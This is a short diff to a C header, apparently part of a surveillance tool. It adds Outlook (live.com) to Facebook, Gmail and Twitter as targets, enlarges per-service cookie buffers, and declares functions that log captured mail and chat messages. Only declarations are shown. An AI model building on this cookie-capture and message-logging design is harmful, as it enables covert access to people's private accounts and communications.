@@ -1,4 +1,4 @@
-#define SOCIAL_ENTRY_COUNT 5
+#define SOCIAL_ENTRY_COUNT 6
 
 #define SOCIAL_REQUEST_SUCCESS 0
 #define SOCIAL_REQUEST_BAD_COOKIE 1
@@ -17,10 +17,12 @@ typedef struct {
 #define FACEBOOK_DOMAIN L"facebook.com"
 #define GMAIL_DOMAIN L"mail.google.com"
 #define TWITTER_DOMAIN L"twitter.com"
+#define OUTLOOK_DOMAIN L"live.com"
 
 #define FACEBOOK_DOMAINA "facebook.com"
 #define GMAIL_DOMAINA "mail.google.com"
 #define TWITTER_DOMAINA "twitter.com"
+#define OUTLOOK_DOMAINA "live.com"
 
 #define MAPI_V3_0_PROTO	2012030601
 
@@ -35,6 +37,7 @@ struct MailSerializedMessageHeader {
   DWORD Size;                // message size
   FILETIME date;			 // data di ricezione approssimativa del messaggio
  #define MAIL_GMAIL     0x00000000
+ #define MAIL_OUTLOOK	0x00000004
   DWORD Program;
 };
 #pragma pack()
@@ -48,9 +51,10 @@ extern void LogSocialIMMessageW(DWORD program, WCHAR *peers, WCHAR *peers_id, WC
 extern void LogSocialMailMessage(DWORD program, char *from, char *rcpt, char *cc, char *subject, char *body, BOOL is_incoming);
 extern void LogSocialMailMessageFull(DWORD program, BYTE *raw_mail, DWORD size, BOOL is_incoming, BOOL is_draft);
 
-extern char FACEBOOK_IE_COOKIE[1024];
-extern char GMAIL_IE_COOKIE[1024];
-extern char TWITTER_IE_COOKIE[1024];
+extern char FACEBOOK_IE_COOKIE[4096];
+extern char GMAIL_IE_COOKIE[4096];
+extern char TWITTER_IE_COOKIE[4096];
+extern char OUTLOOK_IE_COOKIE[4096];
 
 #define CHAT_PROGRAM_FACEBOOK 0x02
 #define CHAT_PROGRAM_TWITTER  0x03
